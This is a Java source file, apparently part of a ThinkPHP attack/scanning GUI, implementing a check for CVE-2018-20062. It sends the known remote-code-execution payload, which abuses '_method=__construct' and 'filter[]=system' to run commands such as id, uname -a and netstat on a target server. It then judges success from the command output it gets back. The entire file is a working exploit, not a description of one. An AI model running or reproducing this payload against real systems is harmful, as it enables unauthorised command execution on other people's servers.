package exploit;

import com.example.thinkphpgui.ConfigManager;
import com.example.thinkphpgui.Exploit;
import com.example.thinkphpgui.utils.HttpRequestUtil;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Stream;

public class Tp_CVE_2018_20062 implements Exploit {
    ConfigManager configManager = ConfigManager.getInstance();
    private final List<String> commandList = new ArrayList<>(Arrays.asList("id", "uname%20-a", "netstat", "dir"));

    public void startScan(String url) {
        verify(url);
    }

    private void verify(String url) {

        for (String module : ConfigManager.moduleList) {
            for (String command : commandList) {

                try {
                    HttpURLConnection httpURLConnection = HttpRequestUtil.post(url + "?s=" + module);
                    httpURLConnection.setDoOutput(true);
                    httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                    String postData = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=" + command;
                    try (OutputStream outputStream = httpURLConnection.getOutputStream()) {
                        outputStream.write(postData.getBytes(StandardCharsets.UTF_8));
                    }
                    BufferedReader bufferedReader;
                    if (httpURLConnection.getResponseCode() >= 400) {
                        bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
                    } else {
                        bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                    }
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        if (Stream.of("PHP Core", "PHP Variables", "PHP License", "uid=", "groups=", "gid=", "x86_64", "i686", "i386", "ESTABLISHED", "CLOSE_WAIT", "LAST_ACK", "TIME_WAIT", "GNU/Linux", "<DIR>").anyMatch(line::contains)) {
                            configManager.appendToTextArea("[+] " + url + "   存在Tp CVE-2018-20062");
                            return;
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }

        configManager.appendToTextArea("[-] " + url + "   不存在Tp CVE-2018-20062");
    }
}
